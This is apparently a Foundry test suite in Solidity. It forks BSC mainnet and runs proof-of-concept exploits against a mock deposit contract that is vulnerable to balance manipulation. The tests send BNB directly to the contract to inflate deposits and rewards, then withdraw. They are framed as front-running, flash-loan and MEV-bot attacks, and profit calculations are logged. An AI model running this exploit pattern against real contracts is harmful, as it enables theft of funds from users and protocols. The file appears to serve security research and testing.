// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/vulnerable/VulnerableDepositBNB.sol";
import "../src/vulnerable/ADACashMock.sol";
import "../src/interfaces/IPancakeRouter.sol";
import "../src/interfaces/IERC20.sol";

contract SandwichAttackTest is Test {
    ADACashMock adaCash;
    VulnerableDepositBNB vulnerable;
    
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    
    function setUp() public {
        // Fork BSC mainnet
        vm.createSelectFork("https://bsc-dataseed1.binance.org/", 15259039);
        
        // Deploy contracts
        adaCash = new ADACashMock();
        vulnerable = new VulnerableDepositBNB(address(adaCash), PANCAKE_ROUTER);
        
        // Fund contracts
        adaCash.transfer(address(vulnerable), adaCash.totalSupply() / 2);
        
        // Fund participants
        vm.deal(attacker, 1000 ether);
        vm.deal(victim, 100 ether);
    }
    
    function testSandwichAttackMechanics() public {
        console.log("=== Sandwich Attack Simulation ===");
        
        // Step 1: Attacker exploits vulnerability to get large ADACash rewards
        vm.startPrank(attacker);
        
        // Manipulate balance and deposit
        payable(address(vulnerable)).transfer(200 ether);
        vulnerable.depositBNB{value: 1 ether}();
        
        uint256 attackerRewards = vulnerable.rewards(attacker);
        console.log("Attacker rewards from exploit:", attackerRewards / 10**18);
        
        vm.stopPrank();
        
        // Step 2: Victim tries to interact with the system (unaware of exploit)
        vm.startPrank(victim);
        
        // Victim makes a normal deposit
        vulnerable.depositBNB{value: 10 ether}();
        uint256 victimRewards = vulnerable.rewards(victim);
        console.log("Victim rewards from normal deposit:", victimRewards / 10**18);
        
        vm.stopPrank();
        
        // Step 3: Demonstrate the disparity
        console.log("\n=== Attack Impact Analysis ===");
        console.log("Attacker deposit: 1 BNB (but recorded as ~201 BNB)");
        console.log("Victim deposit: 10 BNB (recorded correctly)");
        console.log("Attacker rewards:", attackerRewards / 10**18, "ADACash");
        console.log("Victim rewards:", victimRewards / 10**18, "ADACash");
        
        uint256 rewardRatio = attackerRewards / victimRewards;
        console.log("Reward disparity ratio:", rewardRatio, ":1");
        
        // Verify the unfair advantage
        assertGt(attackerRewards, victimRewards * 10, "Exploit didn't provide significant advantage");
        
        console.log("\n[ANALYSIS] Attacker gained unfair advantage through balance manipulation");
    }
    
    function testFrontRunningScenario() public {
        console.log("=== Front-Running Attack Scenario ===");
        
        // Simulate mempool monitoring and front-running
        vm.startPrank(attacker);
        
        console.log("Step 1: Attacker monitors mempool for large deposits");
        
        // Attacker sees victim's pending transaction and front-runs
        console.log("Step 2: Attacker front-runs with balance manipulation");
        
        // Front-running transaction
        payable(address(vulnerable)).transfer(150 ether);
        vulnerable.depositBNB{value: 0.5 ether}();
        
        vm.stopPrank();
        
        // Victim's transaction executes after manipulation
        vm.startPrank(victim);
        console.log("Step 3: Victim's transaction executes (now disadvantaged)");
        
        vulnerable.depositBNB{value: 20 ether}();
        
        vm.stopPrank();
        
        // Back-running: Attacker claims rewards immediately
        vm.startPrank(attacker);
        console.log("Step 4: Attacker back-runs to claim inflated rewards");
        
        uint256 attackerRewards = vulnerable.rewards(attacker);
        uint256 victimRewards = vulnerable.rewards(victim);
        
        console.log("Attacker rewards:", attackerRewards / 10**18);
        console.log("Victim rewards:", victimRewards / 10**18);
        
        // Attacker withdraws and profits
        vulnerable.withdraw(vulnerable.deposits(attacker));
        
        vm.stopPrank();
        
        console.log("\n[MEV ANALYSIS] Classic sandwich attack pattern executed");
        assertGt(attackerRewards, victimRewards, "Front-running didn't provide advantage");
    }
    
    function testFlashLoanSandwichCombo() public {
        console.log("=== Flash Loan + Sandwich Attack Combo ===");
        
        vm.startPrank(attacker);
        
        // Phase 1: Flash loan setup (simulated)
        console.log("Phase 1: Flash loan 226 BNB from PancakeSwap");
        uint256 flashLoanAmount = 226 ether;
        vm.deal(attacker, attacker.balance + flashLoanAmount + 5 ether); // Extra for profit
        
        // Phase 2: Sandwich attack preparation
        console.log("Phase 2: Front-run victim transactions");
        
        // Send flash loan funds to manipulate balance
        payable(address(vulnerable)).transfer(flashLoanAmount);
        
        // Minimal deposit to trigger massive reward calculation
        vulnerable.depositBNB{value: 1 ether}(); // Increase deposit for better profit
        
        uint256 recordedDeposit = vulnerable.deposits(attacker);
        uint256 calculatedRewards = vulnerable.rewards(attacker);
        
        console.log("Flash loan amount:", flashLoanAmount / 1 ether);
        console.log("Actual deposit: 1 BNB");
        console.log("Recorded deposit:", recordedDeposit / 1 ether);
        console.log("Calculated rewards:", calculatedRewards / 10**18, "ADACash");
        
        // Phase 3: Profit extraction
        console.log("Phase 3: Extract maximum profit");
        
        uint256 balanceBeforeWithdraw = attacker.balance;
        vulnerable.withdraw(recordedDeposit);
        uint256 balanceAfterWithdraw = attacker.balance;
        
        uint256 withdrawnAmount = balanceAfterWithdraw - balanceBeforeWithdraw;
        console.log("Withdrawn amount:", withdrawnAmount / 1 ether);
        
        // Phase 4: Flash loan repayment simulation
        console.log("Phase 4: Repay flash loan with fees");
        
        uint256 flashLoanFee = (flashLoanAmount * 25) / 10000; // 0.25% fee
        uint256 repaymentAmount = flashLoanAmount + flashLoanFee;
        console.log("Flash loan fee:", flashLoanFee / 1 ether);
        console.log("Total repayment:", repaymentAmount / 1 ether);
        
        // Calculate net profit
        uint256 netProfit = withdrawnAmount > repaymentAmount ? 
            withdrawnAmount - repaymentAmount : 0;
        
        console.log("Net profit:", netProfit / 1 ether);
        console.log("Additional rewards:", calculatedRewards / 10**18);
        
        vm.stopPrank();
        
        // Verify profitability
        assertGt(withdrawnAmount, repaymentAmount, "Attack not profitable");
        assertGt(calculatedRewards, 0, "No rewards calculated");
        
        console.log("\n[SUCCESS] Combined flash loan + sandwich attack profitable");
    }
    
    function testMEVBotSimulation() public {
        console.log("=== MEV Bot Attack Simulation ===");
        
        // Simulate MEV bot detecting profitable opportunity
        vm.startPrank(attacker);
        
        console.log("MEV Bot Analysis:");
        console.log("- Vulnerable contract detected: depositBNB() flaw");
        console.log("- Flash loan availability: PancakeSwap WBNB-BUSD pair");
        console.log("- Profit potential: Balance manipulation exploit");
        
        // MEV bot execution
        uint256 startBalance = attacker.balance;
        console.log("Starting balance:", startBalance / 1 ether);
        
        // Optimal attack parameters
        uint256 optimalFlashLoan = 226 ether; // Match historical attack
        uint256 minimalDeposit = 0.1 ether;
        
        // Execute MEV strategy
        payable(address(vulnerable)).transfer(optimalFlashLoan);
        vulnerable.depositBNB{value: minimalDeposit}();
        
        // Calculate returns
        uint256 maxWithdrawable = vulnerable.deposits(attacker);
        uint256 potentialRewards = vulnerable.rewards(attacker);
        
        console.log("\nMEV Bot Results:");
        console.log("Flash loan used:", optimalFlashLoan / 1 ether);
        console.log("Deposit made:", minimalDeposit / 1 ether);
        console.log("Withdrawable amount:", maxWithdrawable / 1 ether);
        console.log("Potential rewards:", potentialRewards / 10**18, "ADACash");
        
        // Profit calculation
        uint256 grossProfit = maxWithdrawable > (optimalFlashLoan + minimalDeposit) ?
            maxWithdrawable - (optimalFlashLoan + minimalDeposit) : 0;
        
        uint256 flashLoanCost = (optimalFlashLoan * 25) / 10000; // 0.25% fee
        uint256 netProfit = grossProfit > flashLoanCost ? grossProfit - flashLoanCost : 0;
        
        console.log("Gross profit:", grossProfit / 1 ether);
        console.log("Flash loan cost:", flashLoanCost / 1 ether);
        console.log("Net profit:", netProfit / 1 ether);
        console.log("ROI:", grossProfit > 0 ? (netProfit * 100) / minimalDeposit : 0, "%");
        
        vm.stopPrank();
        
        // Verify MEV bot profitability
        assertGt(grossProfit, flashLoanCost, "MEV strategy not profitable");
        
        console.log("\n[MEV ANALYSIS] Automated exploit detection and execution successful");
    }
    
    // Helper function to receive ETH
    receive() external payable {}
}